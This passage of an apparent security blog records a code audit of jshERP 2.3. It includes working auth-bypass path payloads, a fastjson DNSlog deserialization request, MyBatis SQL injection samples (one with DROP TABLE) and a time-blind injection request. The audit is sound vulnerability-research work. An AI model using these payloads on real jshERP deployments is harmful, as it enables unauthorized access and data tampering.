D:\\Java\\jdk1.8\\jre\\lib\\ext\\sunpkcs11.jar; D:\\Java\\jdk1.8\\jre\\lib\\ext\\zipfs.jar; D:\\Java\\jdk1.8\\jre\\lib\\javaws.jar; D:\\Java\\jdk1.8\\jre\\lib\\jce.jar; D:\\Java\\jdk1.8\\jre\\lib\\jfr.jar; D:\\Java\\jdk1.8\\jre\\lib\\jfxswt.jar; D:\\Java\\jdk1.8\\jre\\lib\\jsse.jar; D:\\Java\\jdk1.8\\jre\\lib\\management-agent.jar; D:\\Java\\jdk1.8\\jre\\lib\\plugin.jar; D:\\Java\\jdk1.8\\jre\\lib\\resources.jar; D:\\Java\\jdk1.8\\jre\\lib\\rt.jar; D:\\JavaCode\\study_code\\annotation\u0026amp;reflection\\annotation\\target\\classes; C:\\Users\\SZZY\\AppData\\Local\\Programs\\IntelliJ IDEA Ultimate\\lib\\idea_rt.jar */ } } 双亲委派机制 参考：https://javaguide.cn/java/jvm/classloader.html#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B\nhttps://www.cnblogs.com/luckforefforts/p/13642685.html\n如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的加载器都是如此，因此所有的类加载请求都会传给顶层的启动类加载器，只有当父加载器反馈自己无法完成该加载请求（该加载器的搜索范围中没有找到对应的类）时，子加载器才会尝试自己去加载。\n参考文章 java序列化与反序列化全讲解\nhttps://blog.csdn.net/mocas_wang/article/details/107621010\n为什么HashMap要自己实现writeObject和readObject方法？\nhttps://juejin.cn/post/6844903954774491144\n谈谈Java反射：从入门到实践，再到原理\nhttps://juejin.cn/post/6844904025607897096\n设计模式（四）——搞懂什么是代理模式\nhttps://zhuanlan.zhihu.com/p/72644638\nJava类加载机制和对象创建过程\nhttps://segmentfault.com/a/1190000023876273\n","permalink":"http://localhost:1313/xvsf/posts/java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","summary":"\u003ch1 id=\"java-反序列化\"\u003eJava 反序列化\u003c/h1\u003e\n\u003ch1 id=\"1序列化与反序列化\"\u003e1、序列化与反序列化\u003c/h1\u003e\n\u003ch2 id=\"11-什么是序列化反序列化\"\u003e1.1 什么是序列化\u0026amp;反序列化\u003c/h2\u003e\n\u003cp\u003e序列化：将内存中的对象压缩成字节流\u003cbr\u003e\n反序列化：将字节流转化成内存中的对象\u003c/p\u003e\n\u003cp\u003e\u003cimg decoding=\"async\" loading=\"lazy\" src=\"https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749235.png\" style=\"max-width: 100%; height: auto;\"\u003e\u003c/p\u003e\n\u003ch2 id=\"12-为什么有序列化技术\"\u003e1.2 为什么有序列化技术\u003c/h2\u003e\n\u003cp\u003e序列化与反序列化的设计就是用来传输数据的。\u003c/p\u003e","title":"Java 反序列化学习"},{"content":"项目地址：https://github.com/jishenghua/jshERP/releases/tag/2.3\n环境搭建： MySQL 5.7.26，IDEA，Maven 3.9.1，JDK 1.8，\n数据库新建jsh_erp数据库，导入sql文件\nIDEA 的 JDK 版本切换为1.8\nMaven构建\n运行 ErpApplication.java 启动程序\n目录分析 这个项目的结构更像是 MVC 架构（ Mapper/MapperXML； Controller ），又增加了 Service 层 。\nMaven Assembly 插件，用于帮助打包； assembly.xml 是打包的配置文件 bin 中的文件都是 jshERP 的运行脚本 resources/mapper_xml： MyBatis 框架的 SQL 映射配置文件， “数据库操作说明书” logback-spring.xml：日志文件输出配置 java config PluginBeanConfig.java 插件管理器 Bean PluginConfiguration.java 配置插件系统的运行环境和参数 Swagger2Config.java 用于生成 RESTful API 文档 , 提供文档元信息 TenantConfig.java 项目数据库访问的统一拦截器和插件配置中心 WebConfig.java 指定前端静态文件存放位置， 在 Spring Boot 内置 Web 服务器中生效 constants BusinessConstants 业务字典类 ExceptionConstants 异常与返回码管理类 controller Web 层接口 datasource 数据源和数据库访问配置 exception 异常处理 filter LogCostFilter 自定义 Servlet 过滤器， 控制用户访问权限和登录请求处理 service 业务逻辑层 utils 工具类 ErpApplication.java 入口类，参考SpringBoot-注解 @SpringBootApplication 分析 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 //声明 springboot，组合了@SpringBootConfiguration @EnableAutoConfiguration @ComponentScann @SpringBootApplication //MyBatis Mapper 接口扫描路径 @MapperScan(\u0026#34;com.jsh.erp.datasource.mappers\u0026#34;) @ServletComponentScan @EnableScheduling public class ErpApplication{ public static void main(String[] args) throws IOException { ConfigurableApplicationContext context = SpringApplication.run(ErpApplication.class, args); Environment environment = context.getBean(Environment.class); System.out.println(\u0026#34;启动成功，访问地址：http://\u0026#34; + ComputerInfo.getIpAddr() + \u0026#34;:\u0026#34; + environment.getProperty(\u0026#34;server.port\u0026#34;) + \u0026#34;，测试用户：jsh，密码：123456\u0026#34;); } } 代码审计 1、LogCostFilter.java java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 package com.jsh.erp.filter; import org.springframework.util.StringUtils; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import javax.servlet.annotation.WebInitParam; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.util.ArrayList; import java.util.List; import java.util.regex.Matcher; import java.util.regex.Pattern; @WebFilter( filterName = \u0026#34;LogCostFilter\u0026#34;, //过滤器对所有路径都生效 urlPatterns = {\u0026#34;/*\u0026#34;}, initParams = { //要忽略的静态资源 @WebInitParam(name = \u0026#34;ignoredUrl\u0026#34;, value = \u0026#34;.css#.js#.jpg#.png#.gif#.ico\u0026#34;), //允许未登录访问的路径 @WebInitParam(name = \u0026#34;filterPath\u0026#34;, value = \u0026#34;/user/login#/user/registerUser#/v2/api-docs\u0026#34;) } ) public class LogCostFilter implements Filter { private static final String FILTER_PATH = \u0026#34;filterPath\u0026#34;; private static final String IGNORED_PATH = \u0026#34;ignoredUrl\u0026#34;; private static final List\u0026lt;String\u0026gt; ignoredList = new ArrayList\u0026lt;\u0026gt;(); private String[] allowUrls; private String[] ignoredUrls; //将 filterPath 和 ignoredUrl 解析成 allowUrls 和 ignoredList（白名单），用于后续 doFilter 判断 @Override public void init(FilterConfig filterConfig) throws ServletException { String filterPath = filterConfig.getInitParameter(FILTER_PATH); if (!StringUtils.isEmpty(filterPath)) { allowUrls = filterPath.contains(\u0026#34;#\u0026#34;) ? filterPath.split(\u0026#34;#\u0026#34;) : new String[]{filterPath}; } String ignoredPath = filterConfig.getInitParameter(IGNORED_PATH); if (!StringUtils.isEmpty(ignoredPath)) { ignoredUrls = ignoredPath.contains(\u0026#34;#\u0026#34;) ? ignoredPath.split(\u0026#34;#\u0026#34;) : new String[]{ignoredPath}; for (String ignoredUrl : ignoredUrls) { ignoredList.add(ignoredUrl); } } } @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { HttpServletRequest servletRequest = (HttpServletRequest) request; HttpServletResponse servletResponse = (HttpServletResponse) response; String requestUrl = servletRequest.getRequestURI(); //具体，比如：处理若用户未登录，则跳转到登录页 Object userInfo = servletRequest.getSession().getAttribute(\u0026#34;user\u0026#34;); if(userInfo!=null) { //如果已登录，不阻止 chain.doFilter(request, response); return; } //未登录时允许访问的页面 if (requestUrl != null \u0026amp;\u0026amp; (requestUrl.contains(\u0026#34;/doc.html\u0026#34;) || requestUrl.contains(\u0026#34;/register.html\u0026#34;) || requestUrl.contains(\u0026#34;/login.html\u0026#34;))) { chain.doFilter(request, response); return; } // ignoredList if (verify(ignoredList, requestUrl)) { chain.doFilter(servletRequest, response); return; } // allowUrls if (null != allowUrls \u0026amp;\u0026amp; allowUrls.length \u0026gt; 0) { for (String url : allowUrls) { if (requestUrl.startsWith(url)) { chain.doFilter(request, response); return; } } } //if 条件都不满足，重定向到 /login.html servletResponse.sendRedirect(\u0026#34;/login.html\u0026#34;); } private static String regexPrefix = \u0026#34;^.*\u0026#34;; private static String regexSuffix = \u0026#34;.*$\u0026#34;; private static boolean verify(List\u0026lt;String\u0026gt; ignoredList, String url) { for (String regex : ignoredList) { Pattern pattern = Pattern.compile(regexPrefix + regex + regexSuffix); Matcher matcher = pattern.matcher(url); if (matcher.matches()) { return true; } } return false; } @Override public void destroy() { } } 过滤逻辑：\n放行： Session 中有 user 访问 /doc.html /register.html /login.html ignoredList 静态资源 allowUrls /user/login /user/registerUser /v2/api-docs 其他全部重定向到 /login.html 缺陷： 虽然有白名单，但路径匹配不完整，如果在 url 中构建如：1.css/../index.html doc.html/../index.html 等，就会绕过 漏洞利用：\npayload：\nplain\r1 2 3 4 5 /doc.html/../home.html /register.html/../home.html /login.html/../home.html /1.css/../home.html /user/login/../../home.html 注意：\n这抓包中有时会抓到这样一行数据： If-Modified-Since: Tue, 05 Jan 2021 22:51:28 GMT\n这是浏览器的本地缓存，如果这个资源自这个时间点之后没有修改，就返回304\n把这个去掉就可以正常注入了\n2、pom.xml - Maven 依赖 2.1 fastjson-1.2.55-反序列化漏洞 入口点：parseObject\n**全局搜索 parseObject **，找一个带有可控变量的点\n找到 src/main/java/com/jsh/erp/utils/StringUtil.java 中有利用点\n分析链： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public static String getInfo(String search, String key){ //返回值初始化为空字符串 String value = \u0026#34;\u0026#34;; //判断 search 是否为空 if(search!=null) { //将 search 解析为 JSONObject JSONObject obj = JSONObject.parseObject(search); //从 JSONObject 取一个 key 并转化为 String value = obj.getString(key); //如果取到空字符串，value = null; if(value.equals(\u0026#34;\u0026#34;)) { value = null; } } return value; } 跟进 JSONObject.parseObject\njava\r1 2 3 4 5 6 public static JSONObject parseObject(String text) { //调用了 parse 方法，把 text 解析成一个 Java 对象 Object obj = parse(text); if (obj instanceof JSONObject) { return (JSONObject) obj; } 跟进 parse(String text)\njava\r1 2 3 4 public static Object parse(String text) { //调用了另一个 parse return parse(text, DEFAULT_PARSER_FEATURE); } 跟进 parse(String text, int features)\njava\r1 2 3 4 public static Object parse(String text, int features) { //引入了 ParserConfig.getGlobalInstance() 方法 return parse(text, ParserConfig.getGlobalInstance(), features); } 跟进 parse(String text, ParserConfig config, int features)\njava\r1 2 3 4 5 6 7 8 9 10 11 12 public static Object parse(String text, ParserConfig config, int features) { if (text == null) { return null; } DefaultJSONParser parser = new DefaultJSONParser(text, config, features); //解析 JSON Object value = parser.parse(); parser.handleResovleTask(value); parser.close(); return value; } 跟进 DefaultJSONParser\njava\r1 2 3 4 public DefaultJSONParser(final String input, final ParserConfig config, int features){ //创建 JSONScanner ，传给下一个核心构造器 this(input, new JSONScanner(input, features), config); } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public DefaultJSONParser(final Object input, final JSONLexer lexer, final ParserConfig config){ //lexer：词法分析器。 this.lexer = lexer; //用户输入的 JSON 字符串 this.input = input; this.config = config; this.symbolTable = config.symbolTable; //获取 JSON 输入的第一个字符，用于判断 JSON 的类型：{ 对象；[ 数组；其他（数字、字符串、布尔等） int ch = lexer.getCurrent(); if (ch == \u0026#39;{\u0026#39;) { lexer.next(); ((JSONLexerBase) lexer).token = JSONToken.LBRACE; } else if (ch == \u0026#39;[\u0026#39;) { lexer.next(); ((JSONLexerBase) lexer).token = JSONToken.LBRACKET; } else { lexer.nextToken(); // prime the pump } } lexer（词法分析器）与 parser（语法分析器）\nhttps://blog.csdn.net/buguge/article/details/147525215\n词法分析器(Lexer)和语法分析器(Parser)是两个核心组件，它们协同工作将原始输入(如JSON字符串、代码文件)转换为结构化数据(如对象、抽象语法树)\n返回一步，Object value = parser.parse(); 跟进 parse()\njava\r1 2 3 public Object parse() { return parse(null); } java\r1 2 3 4 5 6 7 8 public Object parse(Object fieldName) { final JSONLexer lexer = this.lexer; switch (lexer.token()) { ... case LBRACE: JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField)); return parseObject(object, fieldName); ... 跟进 parseObject\njava\r1 public final Object parseObject(final Map object, Object fieldName) { 在这个类中找我们需要的处理 @type 的部分，搜索 checkAutoType\njava\r1 2 3 4 5 //JSON.DEFAULT_TYPE_KEY 即 @type if (key == JSON.DEFAULT_TYPE_KEY \u0026amp;\u0026amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) { String typeName = lexer.scanSymbol(symbolTable, \u0026#39;\u0026#34;\u0026#39;); Class\u0026lt;?\u0026gt; clazz = config.checkAutoType(typeName, null, lexer.getFeatures()); 跟进 checkAutoType\njava\r1 public Class\u0026lt;?\u0026gt; checkAutoType(String typeName, Class\u0026lt;?\u0026gt; expectClass, int features) { 来到这个类中，按照之前版本的经验，下一步有个 TypeUtils.loadClass ，继续搜索\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 if (autoTypeSupport || expectClassFlag) { long hash = h3; for (int i = 3; i \u0026lt; className.length(); ++i) { hash ^= className.charAt(i); hash *= PRIME; if (Arrays.binarySearch(acceptHashCodes, hash) \u0026gt;= 0) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true); if (clazz != null) { return clazz; } } if (Arrays.binarySearch(denyHashCodes, hash) \u0026gt;= 0 \u0026amp;\u0026amp; TypeUtils.getClassFromMapping(typeName) == null) { throw new JSONException(\u0026#34;autoType is not support. \u0026#34; + typeName); } } } 跟进 TypeUtils.loadClass\njava\r1 2 3 4 public static Class\u0026lt;?\u0026gt; loadClass(String className, ClassLoader classLoader, boolean cache) { if(className == null || className.length() == 0 || className.length() \u0026gt; 128){ return null; } 下一步执行序列化和反序列化\njava\r1 2 3 4 5 ObjectDeserializer deserializer = config.getDeserializers().get(clazz); if(deserializer != null){ String json = JSON.toJSONString(object); return (T) JSON.parseObject(json, clazz); } 在执行反序列化的过程中，调用实例化的类，执行后续命令\n接下来应该找调用 StringUtil#getInfo 方法的地方\n看了参考文章找到 UserComponent\njava\r1 2 3 4 5 6 7 8 9 private List\u0026lt;?\u0026gt; getUserList(Map\u0026lt;String, String\u0026gt; map)throws Exception { //接收到前端传的 Map\u0026lt;String,String\u0026gt;，包含 search String search = map.get(Constants.SEARCH); String userName = StringUtil.getInfo(search, \u0026#34;userName\u0026#34;); String loginName = StringUtil.getInfo(search, \u0026#34;loginName\u0026#34;); String order = QueryUtils.order(map); String filter = QueryUtils.filter(map); return userService.select(userName, loginName, QueryUtils.offset(map), QueryUtils.rows(map)); } 找 getUserList 的调用地方，这时应该找的是控制器里的方法了\n几个踩坑的地方：\n我们要注意，真正应该调用的是 getUserList(Map\u0026lt;String, String\u0026gt; map)，而上面的都不是正确调用\n找到真正调用 getUserList(Map\u0026lt;String, String\u0026gt; map) 的地方\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 //路径变量 {apiName} @GetMapping(value = \u0026#34;/{apiName}/list\u0026#34;) public String getList(@PathVariable(\u0026#34;apiName\u0026#34;) String apiName, @RequestParam(value = Constants.PAGE_SIZE, required = false) Integer pageSize, @RequestParam(value = Constants.CURRENT_PAGE, required = false) Integer currentPage, //search 可传入 payload @RequestParam(value = Constants.SEARCH, required = false) String search, HttpServletRequest request)throws Exception { //参数全部放入 Map，进行后续处理 Map\u0026lt;String, String\u0026gt; parameterMap = ParamUtils.requestToMap(request); parameterMap.put(Constants.SEARCH, search); PageQueryInfo queryInfo = new PageQueryInfo(); Map\u0026lt;String, Object\u0026gt; objectMap = new HashMap\u0026lt;String, Object\u0026gt;(); 小结利用链：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 @GetMapping(value = \u0026#34;/{apiName}/list\u0026#34;) public String getList(@PathVariable(\u0026#34;apiName\u0026#34;) String apiName, @RequestParam(value = Constants.PAGE_SIZE, required = false) Integer pageSize, @RequestParam(value = Constants.CURRENT_PAGE, required = false) Integer currentPage, @RequestParam(value = Constants.SEARCH, required = false) String search, HttpServletRequest request)throws Exception { -\u0026gt; private List\u0026lt;?\u0026gt; getUserList(Map\u0026lt;String, String\u0026gt; map)throws Exception { String userName = StringUtil.getInfo(search, \u0026#34;userName\u0026#34;); String loginName = StringUtil.getInfo(search, \u0026#34;loginName\u0026#34;); } -\u0026gt; public static String getInfo(String search, String key){ -\u0026gt; String userName = StringUtil.getInfo(search, \u0026#34;userName\u0026#34;); String loginName = StringUtil.getInfo(search, \u0026#34;loginName\u0026#34;); -\u0026gt; JSONObject obj = JSONObject.parseObject(search); -\u0026gt; Object obj = parse(text); -\u0026gt; turn parse(text, DEFAULT_PARSER_FEATURE); -\u0026gt; return parse(text, ParserConfig.getGlobalInstance(), features); -\u0026gt; DefaultJSONParser parser = new DefaultJSONParser(text, config, features); Object value = parser.parse(); -\u0026gt; public Object parse() { return parse(null); } -\u0026gt; return parseObject(object, fieldName); -\u0026gt; public final Object parseObject(final Map object, Object fieldName) { -\u0026gt; Class\u0026lt;?\u0026gt; clazz = config.checkAutoType(typeName, null, lexer.getFeatures()); -\u0026gt; public Class\u0026lt;?\u0026gt; checkAutoType(String typeName, Class\u0026lt;?\u0026gt; expectClass, int features) { -\u0026gt; clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true); -\u0026gt; public static Class\u0026lt;?\u0026gt; loadClass(String className, ClassLoader classLoader, boolean cache) -\u0026gt; ObjectDeserializer deserializer = config.getDeserializers().get(clazz); payload json\r1 2 3 4 { \u0026#34;@type\u0026#34;:\u0026#34;java.net.Inet4Address\u0026#34;, \u0026#34;val\u0026#34;:\u0026#34;xxx.dnslog.cn\u0026#34; } @type：指定 fastjson 要实例化的类， val：这个类的某个字段值\nInet4Address 只能解析 IP/域名，不能触发 LDAP 请求\nhttp\r1 2 3 4 5 6 7 8 9 GET user/list?search=%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22ccne35.dnslog.cn%22%7D HTTP/1.1 Host: 172.28.192.1:8123 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close 断点调试： 调试过程基本和“分析链”中一致，\n通过dnslog探测fastjson的几种方法（java.net.Inet4Address、Inet6Address、InetSocketAddress，url）\nhttps://blog.csdn.net/Adminxe/article/details/105918000\n总结： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 HTTP GET 请求 ：/user/list?search={\u0026#34;@type\u0026#34;:\u0026#34;java.net.Inet4Address\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;xxx.dnslog.cn\u0026#34;} -\u0026gt;\tResourceController.java getList(@PathVariable(\u0026#34;apiName\u0026#34;) String apiName, @RequestParam(value = Constants.PAGE_SIZE, required = false) Integer pageSize, @RequestParam(value = Constants.CURRENT_PAGE, required = false) Integer currentPage, @RequestParam(value = Constants.SEARCH, required = false) String search, HttpServletRequest request) -\u0026gt;\tUserComponent.java getUserList#getInfo(search) -\u0026gt; JSONObject.parseObject(search) -\u0026gt; DefaultJSONParser -\u0026gt; parse -\u0026gt; checkAutoType -\u0026gt; loadClass -\u0026gt; TypeUtils.loadClass -\u0026gt; config.getDeserializers().get(clazz) -\u0026gt; Inet4Address -\u0026gt; MiscCodec#ObjectDeserializer -\u0026gt; return InetAddress.getByName(strVal); //将strVal作为主机名,获取其对应的ip，域名在此处被解析 2.2 log4j （不存在） 并没有导入 log4j-core 包，单独的 log4j-to-slf4j 是不存在漏洞的\nlog4j-to-slf4j 是一个 桥接器（bridge），它把 Log4j 2 API 的调用转发到 SLF4J，由 SLF4J 来真正打印\n2.3 MyBatis CVE-2020-26945（不存在） 漏洞点分析： SerializedCache#deserialize()\njava\r1 2 3 4 5 6 7 8 9 @Override public Object getObject(Object key) { //从底层的 delegate（被代理的对象，一般是一个缓存或Map）中取值 Object object = delegate.getObject(key); // 如果取到的值是 null(过期)，直接返回 null； // 否则将取到的值强转为 byte[]，再调用 deserialize 方法反序列化，恢复成原来的对象 //deserialize((byte[]) object) 就是 RCE 的触发点了 return object == null ? null : deserialize((byte[]) object); } 跟进 delegate.getObject\njava\r1 2 3 4 5 public interface Cache { ... Object getObject(Object key); ... } getObject ctrl+alt+左键 转到声明\n跟进到 ScheduledCache\njava\r1 2 3 4 5 @Override public Object getObject(Object key) { //clearWhenStale() 检查缓存是否“过期” return clearWhenStale() ? null : delegate.getObject(key); } java\r1 2 3 4 5 6 7 private boolean clearWhenStale() { if (System.currentTimeMillis() - lastClear \u0026gt; clearInterval) { clear(); return true; } return false; } 利用条件 用户启用了二级缓存功能 二级缓存其实就是将查询的结果，放入缓存中，下次查询相同的条件时，直接从缓存中获取结果，降低sql服务器的压力\n攻击者可以修改缓存的内容，替换为恶意反序列化数据 用户未设置JEP-290过滤，且没有任何防御反序列化攻击的措施 JEP-290 是从 Java 9 开始引入的，在 Java 8 里 不存在全局或类级序列化过滤器 的机制\n由于找不到可修改的缓存内容，这部分就作为漏洞学习一遍，本系统不存在此漏洞\n接下来的审计按照以下方向进行： SQL 注入 文件安全 （在翻找功能点过程中并没有发现有能上传\u0026amp;读取文件的点） 身份验证\u0026amp;鉴权 （LogCostFilter.java） 第三方组件\u0026amp;依赖 （已分析） 3、Mybatis SQL 注入 Mybatis框架的sql注入关注${}：\n${}用于直接替换SQL语句中的占位符，而#{}用于预编译\nlike模糊查询 sql\r1 2 3 4 5 6 7 8 xml模板： SELECT * FROM users WHERE username LIKE \u0026#39;%${name}%\u0026#39; sql注入： \u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1 执行sql: SELECT * FROM users WHERE username LIKE \u0026#39;%%\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1%\u0026#39; 动态列名 / 表名 sql\r1 2 3 4 5 6 7 8 xml模板： SELECT ${column} FROM users WHERE id = #{id} sql注入： column = \u0026#34;username, password from users --\u0026#34; 执行sql: SELECT username, password from users -- FROM users WHERE id = ? Order By sql\r1 2 3 4 5 6 7 8 xml模板： SELECT * FROM users ORDER BY ${sortColumn} sql注入： sortColumn = \u0026#34;id; DROP TABLE users --\u0026#34; 执行sql: SELECT * FROM users ORDER BY id; DROP TABLE users -- IN sql\r1 2 3 4 5 6 7 8 xml模板： SELECT * FROM users WHERE id IN (${ids}) sql注入： mapper.findByIds(\u0026#34;1,2,3 OR 1=1\u0026#34;); 执行sql: SELECT * FROM users WHERE id IN (1,2,3 OR 1=1) AccoutMapperEx.xml 接下来考虑Controller/Service 中是否传入了 name 参数\n跟进 select，\n从请求参数 map 中解析搜索条件 寻找调用 getAccountList() 的位置\n跟进 select\nselect(String apiName, Map\u0026lt;String, String\u0026gt; parameterMap) 是整个查询模块的统一入口\n继续跟进，\n接下来去找对应的功能点，可以发现，在“基本资料”中都是查询接口，而现在我们需要的是“结算账户”的查询接口，其他的接口也应该存在sql注入，之后查看。\n对“结算账户”的查询点抓包后，正好对应刚才源码中看到的几个参数“name, serialNo, remark”：\n对 name 参数进行sql注入：\n从结果来看时间盲注成功了\nhtml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 GET /account/list?search=%7B%22name%22%3A%221%22%2C%22serialNo%22%3A%222%22%2C%22remark%22%3A%223%22%7D\u0026amp;currentPage=1\u0026amp;pageSize=15 HTTP/1.1 Host: 169.254.252.28:8123 Accept: application/json, text/javascript, */*; q=0.01 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36 X-Requested-With: XMLHttpRequest Referer: http://169.254.252.28:8123/pages/manage/account.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=A4E545CEF643F8473838EB799DB320AD; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1755655005; HMACCOUNT=A245E83F95E74014; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1755656817 Connection: close GET /account/list?search={\u0026#34;name\u0026#34;:\u0026#34;123\u0026#39; or sleep(5)--+\u0026#34;,\u0026#34;serialNo\u0026#34;:\u0026#34;2\u0026#34;,\u0026#34;remark\u0026#34;:\u0026#34;3\u0026#34;}\u0026amp;currentPage=1\u0026amp;pageSize=15 HTTP/1.1 payload： GET /account/list?search=%7B%22name%22%3A%22123%27%20or%20sleep(5)--%2B%22%2C%22serialNo%22%3A%222%22%2C%22remark%22%3A%223%22%7D\u0026amp;currentPage=1\u0026amp;pageSize=15 HTTP/1.1 在Mybatis的日志中， 可以清楚看到 SQL 注入点已经被利用，并且 时间盲注生效：\nDepotMapperEx.xml 通过上述AccoutMapperEx.xml的审计，可以确定该系统中有多个类似的sql注入点，他们的流程都是一致的。\n再以DepotMapperEx.xml 为例：\nplain\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 \u0026lt;select id=\u0026#34;selectByConditionDepot\u0026#34; parameterType=\u0026#34;com.jsh.erp.datasource.entities.DepotExample\u0026#34; resultMap=\u0026#34;ResultMapEx\u0026#34;\u0026gt; select dep.*,usr.username as principalName FROM jsh_depot dep left join jsh_user usr on usr.id=dep.principal and ifnull(usr.status,\u0026#39;0\u0026#39;) not in(\u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;) where 1=1 \u0026lt;if test=\u0026#34;name != null\u0026#34;\u0026gt; and dep.name like \u0026#39;%${name}%\u0026#39; \u0026lt;/if\u0026gt; -\u0026gt;selectByConditionDepot public interface DepotMapperEx { List\u0026lt;DepotEx\u0026gt; selectByConditionDepot( @Param(\u0026#34;name\u0026#34;) String name, @Param(\u0026#34;type\u0026#34;) Integer type, @Param(\u0026#34;remark\u0026#34;) String remark, @Param(\u0026#34;offset\u0026#34;) Integer offset, @Param(\u0026#34;rows\u0026#34;) Integer rows); -\u0026gt;DepotService public List\u0026lt;DepotEx\u0026gt; select(String name, Integer type, String remark, int offset, int rows)throws Exception { List\u0026lt;DepotEx\u0026gt; list=null; try{ list=depotMapperEx.selectByConditionDepot(name, type, remark, offset, rows); }catch(Exception e){ JshException.readFail(logger, e); } return list; } -\u0026gt;select @Override public List\u0026lt;?\u0026gt; select(Map\u0026lt;String, String\u0026gt; map)throws Exception { return getDepotList(map); } private List\u0026lt;?\u0026gt; getDepotList(Map\u0026lt;String, String\u0026gt; map)throws Exception { String search = map.get(Constants.SEARCH); String name = StringUtil.getInfo(search, \u0026#34;name\u0026#34;); Integer type = StringUtil.parseInteger(StringUtil.getInfo(search, \u0026#34;type\u0026#34;)); String remark = StringUtil.getInfo(search, \u0026#34;remark\u0026#34;); String order = QueryUtils.order(map); return depotService.select(name, type, remark, QueryUtils.offset(map), QueryUtils.rows(map)); } -\u0026gt;select /** * 查询 * @param apiName * @param parameterMap * @return */ public List\u0026lt;?\u0026gt; select(String apiName, Map\u0026lt;String, String\u0026gt; parameterMap)throws Exception { if (StringUtil.isNotEmpty(apiName)) { return container.getCommonQuery(apiName).select(parameterMap); } return new ArrayList\u0026lt;Object\u0026gt;(); } -\u0026gt;select @GetMapping(value = \u0026#34;/{apiName}/list\u0026#34;) public String getList(@PathVariable(\u0026#34;apiName\u0026#34;) String apiName, @RequestParam(value = Constants.PAGE_SIZE, required = false) Integer pageSize, @RequestParam(value = Constants.CURRENT_PAGE, required = false) Integer currentPage, @RequestParam(value = Constants.SEARCH, required = false) String search, HttpServletRequest request)throws Exception { Map\u0026lt;String, String\u0026gt; parameterMap = ParamUtils.requestToMap(request); parameterMap.put(Constants.SEARCH, search); PageQueryInfo queryInfo = new PageQueryInfo(); Map\u0026lt;String, Object\u0026gt; objectMap = new HashMap\u0026lt;String, Object\u0026gt;(); if (pageSize != null \u0026amp;\u0026amp; pageSize \u0026lt;= 0) { pageSize = 10; } String offset = ParamUtils.getPageOffset(currentPage, pageSize); if (StringUtil.isNotEmpty(offset)) { parameterMap.put(Constants.OFFSET, offset); } List\u0026lt;?\u0026gt; list = configResourceManager.select(apiName, parameterMap); objectMap.put(\u0026#34;page\u0026#34;, queryInfo); 小结： 通过全局搜索到like '%${name}%'，定位 \u0026lt;select id=\u0026quot;selectByConditionXxxxx\u0026quot;，之后便在 controller 和 service 中找对应的文件名，在其中找到 selectByConditionXxxxx (基本上都在service中)，找到之后会发现 selectByConditionXxxxx 中所需的几个参数，都是来自 select 查询，跟进 select ，找到 getXxxList 方法解析 select(Map\u0026lt;String,String\u0026gt; map) 传入的前端请求参数，跟进 select，发现他是统一接口，通过 apiName 动态调用不同查询。接下来就在前端找对应的功能点，在”基本资料“里可以看到有查询功能，通过抓包或者对应名称来确定需要的接口，例如：GET 